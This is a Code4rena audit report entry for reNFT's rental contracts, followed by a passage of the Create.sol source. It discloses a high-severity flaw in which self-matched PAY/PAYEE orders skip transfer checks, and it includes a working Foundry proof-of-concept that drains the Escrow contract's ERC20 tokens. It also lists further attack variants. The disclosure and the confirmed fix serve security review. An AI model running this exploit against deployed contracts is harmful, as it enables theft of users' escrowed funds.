{
  "Title": "[H-06] Escrow contract can be drained by creating rentals that bypass execution invariant checks",
  "Content": "\n<https://github.com/re-nft/smart-contracts/blob/main/src/policies/Create.sol#L540-L544> \n\n<https://github.com/re-nft/smart-contracts/blob/main/src/policies/Create.sol#L695>\n\nThe Escrow contract where ERC20 tokens are escrowed for payments can be completely drained.\n\n### Proof of Concept\n\nIt is possible to create rentals where no assets are transfered, but storage is still updated as normal. Then these fake rentals can be stopped to drain ERC20 tokens from the Escrow contract.\n\nThe `Create` contract [checks the expected receivers of ERC20 tokens and NFTs via `_executionInvariantChecks()`](https://github.com/re-nft/smart-contracts/blob/main/src/policies/Create.sol#L540-L544).\n\nThis is to make sure that ERC20 tokens go to the Escrow contract, while NFTs go to the corresponding Safe wallet.\n\nThe key point of the attack is to fulfill an order, so that [the executions length is zero and no execution is checked](https://github.com/re-nft/smart-contracts/blob/main/src/policies/Create.sol#L695).\n\nThis is possible by making the offerer fulfill all the considerations within the same address of the offers.\n\nI'm assuming this is because of point 9 in the [Match Orders section of SeaPort Docs](https://docs.opensea.io/reference/seaport-overview#section-match-orders). Nevertheless, since SeaPort was forked, the coded POC still shows how the attack is possible.\n\n> 9.  Perform transfers as part of each execution\n>\n> *   Ignore each execution where \\`to == from\\`\\`\n\nTo put it in an example:\n\n1.  Carol signs a normal `PAY` rental order with an NFT + ERC20 tokens as an offer\n2.  Carol signs the malicious `PAYEE` counterpart order setting the recipient as her address (instead of the Safe for the NFT, and the ESCRW for the ERC20 tokens)\n3.  Carol matches those orders via the forked SeaPort\n4.  SeaPort calculates the `totalExecutions`, and since all offers and considerations are from the same address, there are no executions, as there will be no transfers\n5.  Both the `PAY` & `PAYEE` ordered are fulfilled and call `Create::validateOrder()`\n6.  No recipient checks are performed, since there are no executions\n7.  The `STORE` storage [will add the new rental](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L595) for Carol, while [increasing the deposit amount in the Escrow](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L601)\n8.  SeaPort ends the order matching and fulfillment without performing any transfer\n9.  The rent can be stopped and it will drain the Escrow contract of any token + amount specified in the fake rent\n\nThe following POC proves how this is still possible with the forked SeaPort version and the current contracts.\n\nNote: For the sake of simplicity this POC:\n\n*   It [deals](https://book.getfoundry.sh/cheatcodes/deal?highlight=deal#deal) some ERC20 tokens to the Escrow contract to be stolen (instead of simulating another legit rental). It doesn't affect the outcome, as the tokens are stolen, regardless of whom they \"belong to\".\n*   It uses a fixture `carol.safe = SafeL2(payable(carol.addr));` just to make an ad-hoc replacement [for the ERC721 consideration recipient](https://github.com/re-nft/smart-contracts/blob/main/test/fixtures/engine/OrderCreator.sol#L213) in the `PAYEE` order creation, and make the POC shorter. It is reset right after `createOrder()` is called.\n*   It uses a fixture `ESCRW = PaymentEscrow(carol.addr);` just to make an ad-hoc replacement [for the ERC20 consideration recipient](https://github.com/re-nft/smart-contracts/blob/main/test/fixtures/engine/OrderCreator.sol#L250) in the `PAYEE` order creation, and make the POC shorter. It is reset right after `createOrder()` is called.\n\nCreate a new file with this test in `smart-contracts/test/integration/Drain.t.sol`:\n\n<Details>\n\n```solidity\n// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.20;\n\nimport {\n    Order,\n    FulfillmentComponent,\n    Fulfillment,\n    ItemType as SeaportItemType\n} from \"@seaport-types/lib/ConsiderationStructs.sol\";\n\nimport {Errors} from \"@src/libraries/Errors.sol\";\nimport {OrderType, OrderMetadata, RentalOrder} from \"@src/libraries/RentalStructs.sol\";\n\nimport {BaseTest} from \"@test/BaseTest.sol\";\nimport {ProtocolAccount} from \"@test/utils/Types.sol\";\n\nimport {SafeUtils} from \"@test/utils/GnosisSafeUtils.sol\";\nimport {Safe} from \"@safe-contracts/Safe.sol\";\n\nimport {SafeL2} from \"@safe-contracts/SafeL2.sol\";\nimport {PaymentEscrow} from \"@src/modules/PaymentEscrow.sol\";\n\ncontract TestDrain is BaseTest {\n    function test_Drain_Escrow() public {\n        // create a legit PAY order\n        createOrder({\n            offerer: carol,\n            orderType: OrderType.PAY,\n            erc721Offers: 1,\n            erc1155Offers: 0,\n            erc20Offers: 1,\n            erc721Considerations: 0,\n            erc1155Considerations: 0,\n            erc20Considerations: 0\n        });\n\n        // finalize the pay order creation\n        (\n            Order memory payOrder,\n            bytes32 payOrderHash,\n            OrderMetadata memory payOrderMetadata\n        ) = finalizeOrder();\n\n        // create an order fulfillment for the pay order\n        createOrderFulfillment({\n            _fulfiller: carol,\n            order: payOrder,\n            orderHash: payOrderHash,\n            metadata: payOrderMetadata\n        });\n\n        // << Malicious order creation below >>\n\n        // fixtures to replace the ERC721 and ERC20 recipients in `createOrder()`\n        // https://github.com/re-nft/smart-contracts/blob/main/test/fixtures/engine/OrderCreator.sol#L213\n        // https://github.com/re-nft/smart-contracts/blob/main/test/fixtures/engine/OrderCreator.sol#L250\n        SafeL2 carolSafe = carol.safe;\n        PaymentEscrow tempESCRW = ESCRW;\n        carol.safe = SafeL2(payable(carol.addr));\n        ESCRW = PaymentEscrow(carol.addr);\n\n        // create a malicious PAYEE order.\n        // It will set the ERC721 and ERC20 recipients as Carol herself\n        createOrder({\n            offerer: carol,\n            orderType: OrderType.PAYEE,\n            erc721Offers: 0,\n            erc1155Offers: 0,\n            erc20Offers: 0,\n            erc721Considerations: 1,\n            erc1155Considerations: 0,\n            erc20Considerations: 1\n        });\n\n        // reset fixtures\n        carol.safe = carolSafe;\n        ESCRW = tempESCRW;\n\n        // finalize the pay order creation\n        (\n            Order memory payeeOrder,\n            bytes32 payeeOrderHash,\n            OrderMetadata memory payeeOrderMetadata\n        ) = finalizeOrder();\n\n        // create an order fulfillment for the payee order\n        createOrderFulfillment({\n            _fulfiller: carol,\n            order: payeeOrder,\n            orderHash: payeeOrderHash,\n            metadata: payeeOrderMetadata\n        });\n\n        // add an amendment to include the seaport fulfillment structs\n        withLinkedPayAndPayeeOrders({payOrderIndex: 0, payeeOrderIndex: 1});\n\n        // Verify Carol's balances and the Escrow balance before the rental attack is performed\n        assertEq(erc20s[0].balanceOf(carol.addr), uint256(10000));\n        assertEq(erc721s[0].ownerOf(0), address(carol.addr));\n        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(0));\n\n        // finalize the order pay/payee order fulfillment\n        (\n            RentalOrder memory payRentalOrder,\n            RentalOrder memory payeeRentalOrder\n        ) = finalizePayOrderFulfillment();\n\n        // << The first part of the attack was performed >>\n        // A new rental was created without any token transfers\n\n        // get the rental order hashes\n        bytes32 payRentalOrderHash = create.getRentalOrderHash(payRentalOrder);\n        bytes32 payeeRentalOrderHash = create.getRentalOrderHash(payeeRentalOrder);\n\n        // assert that the rental order WAS STORED\n        assertEq(STORE.orders(payRentalOrderHash), true);\n\n        // assert that the token IS IN STORAGE\n        assertEq(STORE.isRentedOut(address(carol.safe), address(erc721s[0]), 0), true);\n\n        // assert that Carol DID NOT MAKE A PAYMENT (same balance as before)\n        assertEq(erc20s[0].balanceOf(carol.addr), uint256(10000));\n\n        // assert that NO PAYMENT WAS MADE to the Escrow contract\n        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(0));\n\n        // assert that a payment was synced ERRONEOUSLY in the escrow contract (as no payment was made)\n        assertEq(ESCRW.balanceOf(address(erc20s[0])), uint256(100));\n\n        // assert that the ERC721 IS STILL owned by Carol (it didn't go to the Safe wallet)\n        assertEq(erc721s[0].ownerOf(0), address(carol.addr));\n\n\n        // << The second part of the attack is performed >>\n\n        // speed up in time past the rental expiration\n        // it uses the default values, but an attacker would make the expiration as soon as possible\n        vm.warp(block.timestamp + 750);\n\n        // Transfer the NFT to the Safe, so that the rent stop succeeds while trying to transfer the NFT back\n        vm.prank(carol.addr);\n        erc721s[0].safeTransferFrom(carol.addr, address(carol.safe), 0);\n\n        // Deal some tokens to the Escrow to be stolen\n        // An attacker would first check the tokens balances of the Escrow contract and craft rents matching them\n        deal(address(erc20s[0]), address(ESCRW), 100);\n        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(100));\n\n        // stop the rental order\n        vm.prank(carol.addr);\n        stop.stopRent(payRentalOrder);\n\n        // Carol gets back her NFT, while stealing the ERC20 tokens from the Escrow\n        assertEq(erc20s[0].balanceOf(carol.addr), uint256(10100));\n        assertEq(erc721s[0].ownerOf(0), address(carol.addr));\n\n        // The Escrow contract was drained\n        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(0));\n    }\n}\n```\n\n</details>\n\n### Recommended Mitigation Steps\n\nI would suggest to check that the corresponding offers / considerations are actually included in the `totalExecutions` and **completely fulfilled** with their **corresponding recipients**.\n\nAdding some notes for the protocol to understand the attack surface:\n\nThere are other scenarios possible not exposed on the POC. For example, fulfilling just the NFT as expected to the safe, and only performing the attack on the ERC20, leaving a `totalExecutions` length of 1 (the NFT).  This can be done with ERC1155 as well.\n\nAnother possibility would be to fulfill the orders with multiple other ones, which could generate extra phantom executions.\n\nAlso note, that it is possible to evoid fulfilling `PAYEE` orders via the zone (as noted on another issue I sent).\n\nAll that said regarding the current scope, it would also be recommended to give a second look to the forked SeaPort implementation implementing `totalExecutions` to check if there could be another related attack vector there.\n\n**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/387#issuecomment-1910352735)**\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/14) - Introduces an intermediary transfer on rental creation to ensure assets are not sent to the safe until they have been registered as rented by the protocol.\n\n**Status:** Mitigation confirmed. Full details in reports from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/7), [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/46) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/35).\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2024-01-renft",
  "Code": [
    {
      "filename": "src/policies/Create.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.20;\n\nimport {\n    ZoneParameters,\n    OrderType as SeaportOrderType\n} from \"@seaport-core/lib/rental/ConsiderationStructs.sol\";\nimport {ReceivedItem, SpentItem} from \"@seaport-types/lib/ConsiderationStructs.sol\";\nimport {LibString} from \"@solady/utils/LibString.sol\";\nimport {IERC20} from \"@openzeppelin-contracts/interfaces/IERC20.sol\";\n\nimport {ISafe} from \"@src/interfaces/ISafe.sol\";\nimport {IHook} from \"@src/interfaces/IHook.sol\";\nimport {ZoneInterface} from \"@src/interfaces/IZone.sol\";\n\nimport {Kernel, Policy, Permissions, Keycode} from \"@src/Kernel.sol\";\nimport {toKeycode, toRole} from \"@src/libraries/KernelUtils.sol\";\nimport {RentalUtils} from \"@src/libraries/RentalUtils.sol\";\nimport {Transferer} from \"@src/libraries/Transferer.sol\";\nimport {Signer} from \"@src/packages/Signer.sol\";\nimport {Zone} from \"@src/packages/Zone.sol\";\nimport {Accumulator} from \"@src/packages/Accumulator.sol\";\nimport {TokenReceiver} from \"@src/packages/TokenReceiver.sol\";\nimport {Storage} from \"@src/modules/Storage.sol\";\nimport {PaymentEscrow} from \"@src/modules/PaymentEscrow.sol\";\nimport {\n    RentalOrder,\n    RentPayload,\n    SeaportPayload,\n    Hook,\n    OrderFulfillment,\n    OrderMetadata,\n    OrderType,\n    Item,\n    ItemType,\n    SettleTo,\n    RentalId,\n    RentalAssetUpdate\n} from \"@src/libraries/RentalStructs.sol\";\nimport {Errors} from \"@src/libraries/Errors.sol\";\nimport {Events} from \"@src/libraries/Events.sol\";\n\n/**\n * @title Create\n * @notice Acts as an interface for all behavior related to creating a rental.\n */\ncontract Create is Policy, Signer, Zone, Accumulator, TokenReceiver {\n    using Transferer for address;\n    using Transferer for Item;\n    using RentalUtils for Item;\n    using RentalUtils for Item[];\n    using RentalUtils for SpentItem;\n    using RentalUtils for ReceivedItem;\n    using RentalUtils for OrderType;\n\n    /////////////////////////////////////////////////////////////////////////////////\n    //                         Kernel Policy Configuration                         //\n    /////////////////////////////////////////////////////////////////////////////////\n\n    // Modules that the policy depends on.\n    Storage public STORE;\n    PaymentEscrow public ESCRW;\n\n    /**\n     * @dev Instantiate this contract as a policy.\n     *\n     * @param kernel_ Address of the kernel contract.\n     */\n    constructor(Kernel kernel_) Policy(kernel_) Signer() Zone() {}\n\n    /**\n     * @notice Upon policy activation, configures the modules that the policy depends on.\n     *         If a module is ever upgraded that this policy depends on, the kernel will\n     *         call this function again to ensure this policy has the current address\n     *         of the module.\n     *\n     * @return dependencies Array of keycodes which represent modules that\n     *                      this policy depends on.\n     */\n    function configureDependencies()\n        external\n        override\n        onlyKernel\n        returns (Keycode[] memory dependencies)\n    {\n        dependencies = new Keycode[](2);\n\n        dependencies[0] = toKeycode(\"STORE\");\n        STORE = Storage(getModuleAddress(toKeycode(\"STORE\")));\n\n        dependencies[1] = toKeycode(\"ESCRW\");\n        ESCRW = PaymentEscrow(getModuleAddress(toKeycode(\"ESCRW\")));\n    }\n\n    /**\n     * @notice Upon policy activation, permissions are requested from the kernel to access\n     *         particular keycode <> function selector pairs. Once these permissions are\n     *         granted, they do not change and can only be revoked when the policy is\n     *         deactivated by the kernel.\n     *\n     * @return requests Array of keycode <> function selector pairs which represent\n     *                  permissions for the policy.\n     */\n    function requestPermissions()\n        external\n        view\n        override\n        onlyKernel\n        returns (Permissions[] memory requests)\n    {\n        requests = new Permissions[](2);\n        requests[0] = Permissions(toKeycode(\"STORE\"), STORE.addRentals.selector);\n        requests[1] = Permissions(toKeycode(\"ESCRW\"), ESCRW.increaseDeposit.selector);\n    }\n\n    /////////////////////////////////////////////////////////////////////////////////\n    //                              View Functions                                 //\n    /////////////////////////////////////////////////////////////////////////////////\n\n    /**\n     * @notice Retrieves the domain separator.\n     *\n     * @return The domain separator for the protocol.\n     */\n    function domainSeparator() external view returns (bytes32) {\n        return _DOMAIN_SEPARATOR;\n    }\n\n    /**\n     * @notice Derives the rental order EIP-712 compliant hash from a `RentalOrder`.\n     *\n     * @param order Rental order converted to a hash.\n     */\n    function getRentalOrderHash(\n        RentalOrder memory order\n    ) external view returns (bytes32) {\n        return _deriveRentalOrderHash(order);\n    }\n\n    /**\n     * @notice Derives the rent payload EIP-712 compliant hash from a `RentPayload`.\n     *\n     * @param payload Rent payload converted to a hash.\n     */\n    function getRentPayloadHash(\n        RentPayload memory payload\n    ) external view returns (bytes32) {\n        return _deriveRentPayloadHash(payload);\n    }\n\n    /**\n     * @notice Derives the order metadata EIP-712 compliant hash from an `OrderMetadata`.\n     *\n     * @param metadata Order metadata converted to a hash.\n     */\n    function getOrderMetadataHash(\n        OrderMetadata memory metadata\n    ) external view returns (bytes32) {\n        return _deriveOrderMetadataHash(metadata);\n    }\n\n    /////////////////////////////////////////////////////////////////////////////////\n    //                            Internal Functions                               //\n    /////////////////////////////////////////////////////////////////////////////////\n\n    /**\n     * @dev Helper function to emit an event which signals a rental order has started.\n     *\n     * @param order     Rental order to emit.\n     * @param orderHash Order hash of the seaport order.\n     * @param extraData Any extra data to be emitted which was supplied by the offerer.\n     */\n    function _emitRentalOrderStarted(\n        RentalOrder memory order,\n        bytes32 orderHash,\n        bytes memory extraData\n    ) internal {\n        // Emit the event.\n        emit Events.RentalOrderStarted(\n            orderHash,\n            extraData,\n            order.seaportOrderHash,\n            order.items,\n            order.hooks,\n            order.orderType,\n            order.lender,\n            order.renter,\n            order.rentalWallet,\n            order.startTimestamp,\n            order.endTimestamp\n        );\n    }\n\n    /**\n     * @dev Processes the offer items for inclusion in a BASE order. All offer items must\n     *      adhere to the BASE order format, else execution will revert.\n     *\n     * @param rentalItems Running array of items that comprise the rental order.\n     * @param offers      Array of offer items to include in the the order.\n     * @param startIndex  Index to begin adding the offer items to the\n     *                    `rentalItems` array.\n     */\n    function _processBaseOrderOffer(\n        Item[] memory rentalItems,\n        SpentItem[] memory offers,\n        uint256 startIndex\n    ) internal view {\n        // Put offer length onto the stack.\n        uint256 offerLength = offers.length;\n\n        // Must be at least one offer item.\n        if (offerLength == 0) {\n            revert Errors.CreatePolicy_OfferCountZero();\n        }\n\n        // Must not exceed maximum offer item amount.\n        if (offerLength > STORE.maxOfferItems()) {\n            revert Errors.CreatePolicy_OfferCountExceedsMax(offerLength);\n        }\n\n        // Define elements of the item which depend on the token type.\n        ItemType itemType;\n\n        // Process each offer item.\n        for (uint256 i; i < offerLength; ++i) {\n            // Get the offer item.\n            SpentItem memory offer = offers[i];\n\n            // Handle the ERC721 item.\n            if (offer.isERC721()) {\n                itemType = ItemType.ERC721;\n            }\n            // Handle the ERC1155 item.\n            else if (offer.isERC1155()) {\n                itemType = ItemType.ERC1155;\n            }\n            // ERC20s are not supported as offer items in a BASE order.\n            else {\n                revert Errors.CreatePolicy_SeaportItemTypeNotSupported(offer.itemType);\n            }\n\n            // An ERC721 or ERC1155 offer item is considered a rented asset which will be\n            // returned to the lender upon expiration of the rental order.\n            rentalItems[i + startIndex] = Item({\n                itemType: itemType,\n                settleTo: SettleTo.LENDER,\n                token: offer.token,\n                amount: offer.amount,\n                identifier: offer.identifier\n            });\n        }\n    }\n\n    /**\n     * @dev Processes the offer items for inclusion in a PAY order. All offer items must\n     *      adhere to the PAY order format, else execution will revert.\n     *\n     * @param rentalItems Running array of items that comprise the rental order.\n     * @param offers      Array of offer items to include in the the order.\n     * @param startIndex  Index to begin adding the offer items to the\n     *                    `rentalItems` array.\n     */\n    function _processPayOrderOffer(\n        Item[] memory rentalItems,\n        SpentItem[] memory offers,\n        uint256 startIndex\n    ) internal view {\n        // Keep track of each item type.\n        uint256 totalRentals;\n        uint256 totalPayments;\n\n        // Define elements of the item which depend on the token type.\n        ItemType itemType;\n        SettleTo settleTo;\n\n        // Put offer length onto the stack.\n        uint256 offerLength = offers.length;\n\n        // Must not exceed maximum offer item amount.\n        if (offerLength > STORE.maxOfferItems()) {\n            revert Errors.CreatePolicy_OfferCountExceedsMax(offerLength);\n        }\n\n        // Process each offer item.\n        for (uint256 i; i < offerLength; ++i) {\n            // Get the offer item.\n            SpentItem memory offer = offers[i];\n\n            // Handle the ERC721 item.\n            if (offer.isERC721()) {\n                // The ERC721 will be returned to the lender upon expiration\n                // of the rental order.\n                itemType = ItemType.ERC721;\n                settleTo = SettleTo.LENDER;\n\n                // Increment rentals.\n                totalRentals++;\n            }\n            // Handle the ERC1155 item.\n            else if (offer.isERC1155()) {\n                // The ERC1155 will be returned to the lender upon expiration\n                // of the rental order.\n                itemType = ItemType.ERC1155;\n                settleTo = SettleTo.LENDER;\n\n                // Increment rentals.\n                totalRentals++;\n            }\n            // Process an ERC20 offer item.\n            else if (offer.isERC20()) {\n                // An ERC20 offer item is considered a payment to the renter upon\n                // expiration of the rental order.\n                itemType = ItemType.ERC20;\n                settleTo = SettleTo.RENTER;\n\n                // Increment payments.\n                totalPayments++;\n            }\n            // Revert if unsupported item type.\n            else {\n                revert Errors.CreatePolicy_SeaportItemTypeNotSupported(offer.itemType);\n            }\n\n            // Create the item.\n            rentalItems[i + startIndex] = Item({\n                itemType: itemType,\n                settleTo: settleTo,\n                token: offer.token,\n                amount: offer.amount,\n                identifier: offer.identifier\n            });\n        }\n\n        // PAY order offer must have at least one rental and one payment.\n        if (totalRentals == 0 || totalPayments == 0) {\n            revert Errors.CreatePolicy_ItemCountZero(totalRentals, totalPayments);\n        }\n    }\n\n    /**\n     * @dev Processes the consideration items for inclusion in a BASE order. All\n     *      consideration items must adhere to the BASE order format, else\n     *      execution will revert.\n     *\n     * @param rentalItems    Running array of items that comprise the rental order.\n     * @param considerations Array of consideration items to include in the the order.\n     * @param startIndex     Index to begin adding the offer items to the\n     *                       `rentalItems` array.\n     */\n    function _processBaseOrderConsideration(\n        Item[] memory rentalItems,\n        ReceivedItem[] memory considerations,\n        uint256 startIndex\n    ) internal view {\n        // Put consideration length onto the stack.\n        uint256 considerationLength = considerations.length;\n\n        // Must be at least one consideration item.\n        if (considerationLength == 0) {\n            revert Errors.CreatePolicy_ConsiderationCountZero();\n        }\n\n        // Must not exceed maximum consideration item amount.\n        if (considerationLength > STORE.maxConsiderationItems()) {\n            revert Errors.CreatePolicy_ConsiderationCountExceedsMax(considerationLength);\n        }\n\n        // Process each consideration item.\n        for (uint256 i; i < considerationLength; ++i) {\n            // Get the consideration item.\n            ReceivedItem memory consideration = considerations[i];\n\n            // Only process an ERC20 item.\n            if (!consideration.isERC20()) {\n                revert Errors.CreatePolicy_SeaportItemTypeNotSupported(\n                    consideration.itemType\n                );\n            }\n\n            // An ERC20 consideration item is considered a payment to the lender upon\n            // expiration of the rental order.\n            rentalItems[i + startIndex] = Item({\n                itemType: ItemType.ERC20,\n                settleTo: SettleTo.LENDER,\n                token: consideration.token,\n                amount: consideration.amount,\n                identifier: consideration.identifier\n            });\n        }\n    }\n\n    /**\n     * @dev Processes the consideration items for inclusion in a PAYEE order. All\n     *      consideration items must adhere to the PAYEE order format, else\n     *      execution will revert.\n     *\n     * @param considerations Array of consideration items to include in the the order.\n     */\n    function _processPayeeOrderConsideration(\n        Item[] memory rentalItems,\n        ReceivedItem[] memory considerations,\n        uint256 startIndex\n    ) internal view {\n        // Keep track of each item type.\n        uint256 totalRentals;\n        uint256 totalPayments;\n\n        // Define elements of the item which depend on the token type.\n        ItemType itemType;\n        SettleTo settleTo;\n\n        // Put consideration length onto the stack.\n        uint256 considerationLength = considerations.length;\n\n        // Must not exceed maximum consideration item amount.\n        if (considerationLength > STORE.maxConsiderationItems()) {\n            revert Errors.CreatePolicy_ConsiderationCountExceedsMax(considerationLength);\n        }\n\n        // Process each consideration item.\n        for (uint256 i; i < considerationLength; ++i) {\n            // Get the consideration item.\n            ReceivedItem memory consideration = considerations[i];\n\n            // Process an ERC721 item.\n            if (consideration.isERC721()) {\n                // The ERC1155 will be returned to the lender upon expiration\n                // of the rental order.\n                itemType = ItemType.ERC721;\n                settleTo = SettleTo.LENDER;\n\n                // Increment rentals.\n                totalRentals++;\n            }\n            // Process an ERC1155 item\n            else if (consideration.isERC1155()) {\n                // The ERC1155 will be returned to the lender upon expiration\n                // of the rental order.\n                itemType = ItemType.ERC1155;\n                settleTo = SettleTo.LENDER;\n\n                // Increment rentals.\n                totalRentals++;\n            }\n            // Process an ERC20 item.\n            else if (consideration.isERC20()) {\n                // An ERC20 offer item is considered a payment to the renter upon\n                // expiration of the rental order.\n                itemType = ItemType.ERC20;\n                settleTo = SettleTo.RENTER;\n\n                // Increment payments.\n                totalPayments++;\n            }\n            // Revert if unsupported item type.\n            else {\n                revert Errors.CreatePolicy_SeaportItemTypeNotSupported(\n                    consideration.itemType\n                );\n            }\n\n            // Create the item.\n            rentalItems[i + startIndex] = Item({\n                itemType: itemType,\n                settleTo: settleTo,\n                token: consideration.token,\n                amount: consideration.amount,\n                identifier: consideration.identifier\n            });\n        }\n\n        // PAYEE order consideration must have at least one rental and one payment.\n        if (totalRentals == 0 || totalPayments == 0) {\n            revert Errors.CreatePolicy_ItemCountZero(totalRentals, totalPayments);\n        }\n    }\n\n    /**\n     * @dev Converts an offer array and a consideration array into a single array of\n     *      `Item` which comprise a rental order. The offers and considerations must\n     *      adhere to a specific set of rules depending on the type of order being\n     *      constructed.\n     *\n     * @param offers         Array of Seaport offer items.\n     * @param considerations Array of seaport consideration items.\n     * @param orderType      Order type of the rental.\n     */\n    function _convertToItems(\n        SpentItem[] memory offers,\n        ReceivedItem[] memory considerations,\n        OrderType orderType\n    ) internal view returns (Item[] memory items) {\n        // Initialize an array of items.\n        items = new Item[](offers.length + considerations.length);\n\n        // Process items for a base order.\n        if (orderType.isBaseOrder()) {\n            // Process offer items.\n            _processBaseOrderOffer(items, offers, 0);\n\n            // Process consideration items.\n            _processBaseOrderConsideration(items, considerations, offers.length);\n        }\n        // Process items for a pay order.\n        else if (orderType.isPayOrder()) {\n            // Process offer items.\n            _processPayOrderOffer(items, offers, 0);\n\n            // Assert that no consideration items are provided.\n            if (considerations.length > 0) {\n                revert Errors.CreatePolicy_ConsiderationCountNonZero(\n                    considerations.length\n                );\n            }\n        }\n        // Process items for a payee order.\n        else if (orderType.isPayeeOrder()) {\n            // Assert that no offer items are provided.\n            if (offers.length > 0) {\n                revert Errors.CreatePolicy_OfferCountNonZero(offers.length);\n            }\n\n            // Process consideration items.\n            _processPayeeOrderConsideration(items, considerations, 0);\n        }\n        // Revert if order type is not supported.\n        else {\n            revert Errors.Shared_OrderTypeNotSupported(uint8(orderType));\n        }\n    }\n\n    /**\n     * @dev When a rental order is created, process each hook one by one but only if\n     *      the hook's status is set to execute on a rental start.\n     *\n     * @param hooks        Array of hooks to process for the order.\n     * @param offerItems   Array of offer items which are referenced by the hooks\n     * @param rentalWallet Address of the rental wallet which is the recipient\n     *                     of the rented assets.\n     */\n    function _addHooks(\n        Hook[] memory hooks,\n        SpentItem[] memory offerItems,\n        address rentalWallet\n    ) internal {\n        // Define hook target, offer item index, and an offer item.\n        address target;\n        uint256 itemIndex;\n        SpentItem memory offer;\n\n        // Loop through each hook in the payload.\n        for (uint256 i = 0; i < hooks.length; ++i) {\n            // Get the hook's target address.\n            target = hooks[i].target;\n\n            // Check that the hook is reNFT-approved to execute on rental start.\n            if (STORE.hookOnStart(target)) {\n                // Get the offer item index for this hook.\n                itemIndex = hooks[i].itemIndex;\n\n                // Get the offer item for this hook.\n                offer = offerItems[itemIndex];\n\n                // Make sure the offer item is an ERC721 or ERC1155.\n                if (!offer.isRental()) {\n                    revert Errors.Shared_NonRentalHookItem(itemIndex);\n                }\n\n                // Call the hook with data about the rented item.\n                try\n                    IHook(target).onStart(\n                        rentalWallet,\n                        offer.token,\n                        offer.identifier,\n                        offer.amount,\n                        hooks[i].extraData\n                    )\n                {} catch Error(string memory revertReason) {\n                    // Revert with reason given.\n                    revert Errors.Shared_HookFailString(revertReason);\n                } catch Panic(uint256 errorCode) {\n                    // Convert solidity panic code to string.\n                    string memory stringErrorCode = LibString.toString(errorCode);\n\n                    // Revert with panic code.\n                    revert Errors.Shared_HookFailString(\n                        string.concat(\"Hook reverted: Panic code \", stringErrorCode)\n                    );\n                } catch (bytes memory revertData) {\n                    // Fallback to an error that returns the byte data.\n                    revert Errors.Shared_HookFailBytes(revertData);\n                }\n            }\n        }\n    }\n\n    /**\n     * @dev Initiates a rental order using a rental payload received by the fulfiller,\n     *      and a payload from seaport with data involving the assets that were\n     *      transferred in the order.\n     *\n     * @param payload Payload from the order fulfiller.\n     * @param seaportPayload Payload containing the result of a seaport order fulfillment.\n     */\n    function _rentFromZone(\n        RentPayload memory payload,\n        SeaportPayload memory seaportPayload\n    ) internal {\n        // Check: Only full restricted orders are supported.\n        _isValidSeaportOrderType(seaportPayload.orderType);\n\n        // Check: The payload is being used for the correct order.\n        _isValidPayloadForOrder(payload.orderHash, seaportPayload.orderHash);\n\n        // Check: make sure order metadata is valid with the given seaport order zone hash.\n        _isValidOrderMetadata(payload.metadata, seaportPayload.zoneHash);\n\n        // Check: verify the fulfiller of the order is an owner of the recipient safe.\n        _isValidSafeOwner(seaportPayload.fulfiller, payload.fulfillment.recipient);\n\n        // Check: verify the offerer is not the recipient of any consideration items.\n        _offererNotRecipient(seaportPayload.offerer, seaportPayload.consideration);\n\n        // Check: verify each execution was sent to the expected destination.\n        _executionInvariantChecks(seaportPayload.totalExecutions);\n\n        // Check: validate and process seaport offer and consideration items based\n        // on the order type.\n        Item[] memory items = _convertToItems(\n            seaportPayload.offer,\n            seaportPayload.consideration,\n            payload.metadata.orderType\n        );\n\n        // Check: Once all items have been processed, confirm that all items adhere to the\n        // protocol whitelist for rented assets and payments.\n        _checkProtocolWhitelist(items);\n\n        // PAYEE orders are considered mirror-images of a PAY order. So, PAYEE orders\n        // do not need to be processed in the same way that other order types do.\n        if (\n            payload.metadata.orderType.isBaseOrder() ||\n            payload.metadata.orderType.isPayOrder()\n        ) {\n            // Create an accumulator which will hold all of the rental asset updates, consisting of IDs and\n            // the rented amount. From this point on, new memory cannot be safely allocated until the\n            // accumulator no longer needs to include elements.\n            bytes memory rentalAssetUpdates = new bytes(0);\n\n            // Check if each item is a rental. If so, then generate the rental asset update.\n            // Memory will become safe again after this block.\n            for (uint256 i; i < items.length; ++i) {\n                if (items[i].isRental()) {\n                    // Insert the rental asset update into the dynamic array.\n                    _insert(\n                        rentalAssetUpdates,\n                        items[i].toRentalId(payload.fulfillment.recipient),\n                        items[i].amount\n                    );\n                }\n            }\n\n            // Generate the rental order.\n            RentalOrder memory order = RentalOrder({\n                seaportOrderHash: seaportPayload.orderHash,\n                items: items,\n                hooks: payload.metadata.hooks,\n                orderType: payload.metadata.orderType,\n                lender: seaportPayload.offerer,\n                renter: payload.intendedFulfiller,\n                rentalWallet: payload.fulfillment.recipient,\n                startTimestamp: block.timestamp,\n                endTimestamp: block.timestamp + payload.metadata.rentDuration\n            });\n\n            // Compute the order hash.\n            bytes32 orderHash = _deriveRentalOrderHash(order);\n\n            // Invariant: Add rentals to storage before any other processing, and only\n            // if the order is a Base Order or Pay order.\n            STORE.addRentals(orderHash, _convertToStatic(rentalAssetUpdates));\n\n            // Interaction: Send tokens to their expected destinations. The rented assets\n            // will go to the rental wallet and the payments will go to the escrow.\n            for (uint256 i = 0; i < items.length; ++i) {\n                Item memory item = items[i];\n\n                if (item.isERC20()) {\n                    // Send tokens to the payment escrow.\n                    item.token.transferERC20(address(ESCRW), item.amount);\n\n                    // increase deposit on the escrow\n                    ESCRW.increaseDeposit(item.token, item.amount);\n                } else if (item.isERC721()) 